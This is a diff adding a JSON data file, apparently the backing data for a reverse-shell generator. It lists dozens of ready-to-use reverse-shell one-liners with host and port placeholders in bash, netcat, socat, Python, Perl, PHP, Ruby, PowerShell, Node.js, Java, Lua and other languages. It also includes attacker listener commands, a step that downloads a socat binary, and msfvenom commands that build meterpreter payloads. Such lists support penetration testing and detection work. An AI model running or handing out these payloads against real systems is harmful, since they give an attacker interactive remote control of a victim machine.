@@ -1,0 +1,372 @@
+[
+ {
+  "type": "bash",
+  "note": "",
+  "payload": "/bin/bash -c '/bin/bash -i \u003e\u0026 /dev/tcp/{LHOST}/{LPORT} 0\u003e\u00261' "
+ },
+ {
+  "type": "bash",
+  "note": "",
+  "payload": "/bin/bash -c '/bin/bash -i \u003e /dev/tcp/{LHOST}/{LPORT} 0\u003c\u00261 2\u003e\u00261' "
+ },
+ {
+  "type": "bash",
+  "note": "",
+  "payload": "/bin/bash -i \u003e /dev/tcp/{LHOST}/{LPORT} 0\u003c\u0026 2\u003e\u00261"
+ },
+ {
+  "type": "bash",
+  "note": "",
+  "payload": "bash -i \u003e\u0026 /dev/tcp/{LHOST}/{LPORT} 0\u003e\u00261"
+ },
+ {
+  "type": "bash",
+  "note": "",
+  "payload": "exec 5\u003c\u003e/dev/tcp/{LHOST}/{LPORT};cat \u003c\u00265 | while read line; do $line 2\u003e\u00265 \u003e\u00265; done"
+ },
+ {
+  "type": "bash",
+  "note": "",
+  "payload": "exec /bin/sh 0\u003c/dev/tcp/{LHOST}/{LPORT} 1\u003e\u00260 2\u003e\u00260"
+ },
+ {
+  "type": "bash",
+  "note": "",
+  "payload": "0\u003c\u0026196;exec 196\u003c\u003e/dev/tcp/{LHOST}/{LPORT}; sh \u003c\u0026196 \u003e\u0026196 2\u003e\u0026196"
+ },
+ {
+  "type": "bash",
+  "note": "UDP",
+  "payload": "bash -i \u003e\u0026 /dev/udp/{LHOST}/{LPORT} 0\u003e\u00261"
+ },
+ {
+  "type": "bash",
+  "note": "UDP Listener (attacker)",
+  "payload": "nc -u -lvp {LPORT}"
+ },
+ {
+  "type": "netcat",
+  "note": "",
+  "payload": "nc -e /bin/sh {LHOST} {LPORT}"
+ },
+ {
+  "type": "netcat",
+  "note": "",
+  "payload": "nc -e /bin/bash {LHOST} {LPORT}"
+ },
+ {
+  "type": "netcat",
+  "note": "",
+  "payload": "nc -c bash {LHOST} {LPORT}"
+ },
+ {
+  "type": "netcat",
+  "note": "",
+  "payload": "mknod backpipe p \u0026\u0026 nc {LHOST} {LPORT} 0\u003cbackpipe | /bin/bash 1\u003ebackpipe "
+ },
+ {
+  "type": "netcat",
+  "note": "",
+  "payload": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc {LHOST} {LPORT} \u003e/tmp/f"
+ },
+ {
+  "type": "netcat",
+  "note": "",
+  "payload": "rm -f /tmp/p; mknod /tmp/p p \u0026\u0026 nc {LHOST} {LPORT} 0/tmp/p 2\u003e\u00261"
+ },
+ {
+  "type": "netcat",
+  "note": "",
+  "payload": "rm f;mkfifo f;cat f|/bin/sh -i 2\u003e\u00261|nc {LHOST} {LPORT} \u003e f"
+ },
+ {
+  "type": "netcat",
+  "note": "",
+  "payload": "rm -f x; mknod x p \u0026\u0026 nc {LHOST} {LPORT} 0\u003cx | /bin/bash 1\u003ex"
+ },
+ {
+  "type": "ncat",
+  "note": "",
+  "payload": "ncat {LHOST} {LPORT} -e /bin/bash"
+ },
+ {
+  "type": "ncat",
+  "note": "",
+  "payload": "ncat --udp {LHOST} {LPORT} -e /bin/bash"
+ },
+ {
+  "type": "telnet",
+  "note": "",
+  "payload": "rm -f /tmp/p; mknod /tmp/p p \u0026\u0026 telnet {LHOST} {LPORT} 0/tmp/p 2\u003e\u00261"
+ },
+ {
+  "type": "telnet",
+  "note": "",
+  "payload": "telnet {LHOST} {LPORT} | /bin/bash | telnet {LHOST} 667"
+ },
+ {
+  "type": "telnet",
+  "note": "",
+  "payload": "rm f;mkfifo f;cat f|/bin/sh -i 2\u003e\u00261|telnet {LHOST} {LPORT} \u003e f"
+ },
+ {
+  "type": "telnet",
+  "note": "",
+  "payload": "rm -f x; mknod x p \u0026\u0026 telnet {LHOST} {LPORT} 0\u003cx | /bin/bash 1\u003ex"
+ },
+ {
+  "type": "socat",
+  "note": "",
+  "payload": "/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}"
+ },
+ {
+  "type": "socat",
+  "note": "",
+  "payload": "socat tcp-connect:{LHOST}:{LPORT} exec:\"bash -li\",pty,stderr,setsid,sigint,sane"
+ },
+ {
+  "type": "socat",
+  "note": "",
+  "payload": "wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}"
+ },
+ {
+  "type": "socat",
+  "note": "Listener (attacker)",
+  "payload": "socat file:`tty`,raw,echo=0 TCP-L:{LPORT}"
+ },
+ {
+  "type": "perl",
+  "note": "",
+  "payload": "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"\u003e\u0026S\");open(STDOUT,\"\u003e\u0026S\");open(STDERR,\"\u003e\u0026S\");exec(\"/bin/sh -i\");};' "
+ },
+ {
+  "type": "perl",
+  "note": "",
+  "payload": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{LHOST}:{LPORT}\");STDIN-\u003efdopen($c,r);$~-\u003efdopen($c,w);system$_ while\u003c\u003e;' "
+ },
+ {
+  "type": "perl",
+  "note": "Windows",
+  "payload": "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{LHOST}:{LPORT}\");STDIN-\u003efdopen($c,r);$~-\u003efdopen($c,w);system$_ while\u003c\u003e;' "
+ },
+ {
+  "type": "python",
+  "note": "",
+  "payload": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' "
+ },
+ {
+  "type": "python",
+  "note": "",
+  "payload": "export RHOST=\"{LHOST}\";export RPORT={LPORT};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")' "
+ },
+ {
+  "type": "python",
+  "note": "",
+  "payload": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")' "
+ },
+ {
+  "type": "python",
+  "note": "Windows",
+  "payload": "C:\\Python27\\python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('{LHOST}', {LPORT})), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) \u003e 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\""
+ },
+ {
+  "type": "php",
+  "note": "",
+  "payload": "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' \\"
+ },
+ {
+  "type": "php",
+  "note": "",
+  "payload": "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});$proc=proc_open(\"/bin/sh -i\", array(0=\u003e$s, 1=\u003e$s, 2=\u003e$s),$pipes);' "
+ },
+ {
+  "type": "php",
+  "note": "",
+  "payload": "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});shell_exec(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' "
+ },
+ {
+  "type": "php",
+  "note": "",
+  "payload": "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\";' "
+ },
+ {
+  "type": "php",
+  "note": "",
+  "payload": "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});system(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' "
+ },
+ {
+  "type": "php",
+  "note": "",
+  "payload": "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});popen(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\", \"r\");' "
+ },
+ {
+  "type": "php",
+  "note": "",
+  "payload": "php -r '$s=\\'127.0.0.1\\';$p=443;@error_reporting(0);@ini_set(\"error_log\",NULL);@ini_set(\"log_errors\",0);@set_time_limit(0);umask(0);if($s=fsockopen($s,$p,$n,$n)){if($x=proc_open(\\'/bin/sh$IFS-i\\',array(array(\\'pipe\\',\\'r\\'),array(\\'pipe\\',\\'w\\'),array(\\'pipe\\',\\'w\\')),$p,getcwd())){stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($s,0);while(true){if(feof($s))die(\\'connection/closed\\');if(feof($p[1]))die(\\'shell/not/response\\');$r=array($s,$p[1],$p[2]);stream_select($r,$n,$n,null);if(in_array($s,$r))fwrite($p[0],fread($s,1024));if(in_array($p[1],$r))fwrite($s,fread($p[1],1024));if(in_array($p[2],$r))fwrite($s,fread($p[2],1024));}fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($x);}else{die(\"proc_open/disabled\");}}else{die(\"not/connect\");}' "
+ },
+ {
+  "type": "ruby",
+  "note": "",
+  "payload": "ruby -rsocket -e'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;exec sprintf(\"/bin/sh -i \u003c\u0026%d \u003e\u0026%d 2\u003e\u0026%d\",f,f,f)' "
+ },
+ {
+  "type": "ruby",
+  "note": "",
+  "payload": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{LHOST}\",\"{LPORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' "
+ },
+ {
+  "type": "ruby",
+  "note": "Windows",
+  "payload": "ruby -rsocket -e 'c=TCPSocket.new(\"{LHOST}\",\"{LPORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' "
+ },
+ {
+  "type": "openssl",
+  "note": "",
+  "payload": "mkfifo /tmp/s; /bin/sh -i \u003c /tmp/s 2\u003e\u00261 | openssl s_client -quiet -connect {LHOST}:{LPORT} \u003e /tmp/s; rm /tmp/s"
+ },
+ {
+  "type": "openssl",
+  "note": "Listener (attacker)",
+  "payload": "ncat --ssl -vv -l -p {LPORT}"
+ },
+ {
+  "type": "powershell",
+  "note": "",
+  "payload": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\u003e\u00261 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"\u003e \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+ },
+ {
+  "type": "powershell",
+  "note": "",
+  "payload": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\u003e\u00261 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '\u003e ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
+ },
+ {
+  "type": "awk",
+  "note": "",
+  "payload": "awk 'BEGIN {s = \"/inet/tcp/0/{LHOST}/{LPORT}\"; while(42) { do{ printf \"shell\u003e\" |\u0026 s; s |\u0026 getline c; if(c){ while ((c |\u0026 getline) \u003e 0) print $0 |\u0026 s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
+ },
+ {
+  "type": "tclsh",
+  "note": "",
+  "payload": "echo 'set s [socket {LHOST} {LPORT}];while 42 { puts -nonewline $s \"shell\u003e\";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh"
+ },
+ {
+  "type": "java",
+  "note": "",
+  "payload": "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5\u003c\u003e/dev/tcp/{LHOST}/{LPORT};cat \u003c\u00265 | while read line; do \\$line 2\u003e\u00265 \u003e\u00265; done\"] as String[])\np.waitFor()"
+ },
+ {
+  "type": "java",
+  "note": "",
+  "payload": "String host=\"{LPORT}\";\nint port={LPORT};\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()\u003e0)so.write(pi.read());while(pe.available()\u003e0)so.write(pe.read());while(si.available()\u003e0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"
+ },
+ {
+  "type": "java",
+  "note": "More stealthy",
+  "payload": "Thread thread = new Thread(){public void run(){        //Reverse shell here        }}thread.start();"
+ },
+ {
+  "type": "war",
+  "note": "",
+  "payload": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war \u003e reverse.war\nstrings reverse.war | grep jsp # in order to get the name of the file"
+ },
+ {
+  "type": "lua",
+  "note": "Linux",
+  "payload": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{LHOST}','{LPORT}');os.execute('/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263');\""
+ },
+ {
+  "type": "lua",
+  "note": "Windows",
+  "payload": "lua5.1 -e 'local host, port = \"{LHOST}\", {LPORT} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()' "
+ },
+ {
+  "type": "nodejs",
+  "note": "",
+  "payload": "require('child_process').exec('nc -e /bin/sh {LHOST} {LPORT}')"
+ },
+ {
+  "type": "nodejs",
+  "note": "",
+  "payload": "-var x = global.process.mainModule.require\n-x('child_process').exec('nc {LHOST} {LPORT} -e /bin/bash')"
+ },
+ {
+  "type": "nodejs",
+  "note": "",
+  "payload": "(function(){\n    var net = require(\"net\"),\n        cp = require(\"child_process\"),\n        sh = cp.spawn(\"/bin/sh\", []);\n    var client = new net.Socket();\n    client.connect({LPORT}, \"{LHOST}\", function(){\n        client.pipe(sh.stdin);\n        sh.stdout.pipe(client);\n        sh.stderr.pipe(client);\n    });\n    return /a/; // Prevents the Node.js application form crashing\n})();"
+ },
+ {
+  "type": "groovy",
+  "note": "",
+  "payload": "String host=\"{LHOST}\";\nint port={LPORT};\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()\u003e0)so.write(pi.read());while(pe.available()\u003e0)so.write(pe.read());while(si.available()\u003e0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"
+ },
+ {
+  "type": "groovy",
+  "note": "More stealthy",
+  "payload": "Thread.start {        // Reverse shell here        }"
+ },
+ {
+  "type": "meterpreter",
+  "note": "",
+  "payload": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\"{LHOST}\" LPORT={LPORT} -f elf \u003e shell.elf"
+ },
+ {
+  "type": "meterpreter",
+  "note": "",
+  "payload": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"{LHOST}\" LPORT={LPORT} -f exe \u003e shell.exe"
+ },
+ {
+  "type": "meterpreter",
+  "note": "",
+  "payload": "msfvenom -p osx/x86/shell_reverse_tcp LHOST=\"{LHOST}\" LPORT={LPORT} -f macho \u003e shell.macho"
+ },
+ {
+  "type": "meterpreter",
+  "note": "",
+  "payload": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"{LHOST}\" LPORT={LPORT} -f asp \u003e shell.asp"
+ },
+ {
+  "type": "meterpreter",
+  "note": "",
+  "payload": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"{LHOST}\" LPORT={LPORT} -f raw \u003e shell.jsp"
+ },
+ {
+  "type": "meterpreter",
+  "note": "",
+  "payload": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"{LHOST}\" LPORT={LPORT} -f war \u003e shell.war"
+ },
+ {
+  "type": "meterpreter",
+  "note": "",
+  "payload": "msfvenom -p cmd/unix/reverse_python LHOST=\"{LHOST}\" LPORT={LPORT} -f raw \u003e shell.py"
+ },
+ {
+  "type": "meterpreter",
+  "note": "",
+  "payload": "msfvenom -p cmd/unix/reverse_bash LHOST=\"{LHOST}\" LPORT={LPORT} -f raw \u003e shell.sh"
+ },
+ {
+  "type": "meterpreter",
+  "note": "",
+  "payload": "msfvenom -p cmd/unix/reverse_perl LHOST=\"{LHOST}\" LPORT={LPORT} -f raw \u003e shell.pl"
+ },
+ {
+  "type": "meterpreter",
+  "note": "Windows Staged reverse TCP",
+  "payload": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe \u003e reverse.exe"
+ },
+ {
+  "type": "meterpreter",
+  "note": "Windows Stageless reverse TCP",
+  "payload": "msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe \u003e reverse.exe"
+ },
+ {
+  "type": "meterpreter",
+  "note": "Linux Staged reverse TCP",
+  "payload": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf \u003ereverse.elf"
+ },
+ {
+  "type": "meterpreter",
+  "note": "Linux Stageless reverse TCP",
+  "payload": "msfvenom -p linux/x86/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf \u003ereverse.elf"
+ }
+]
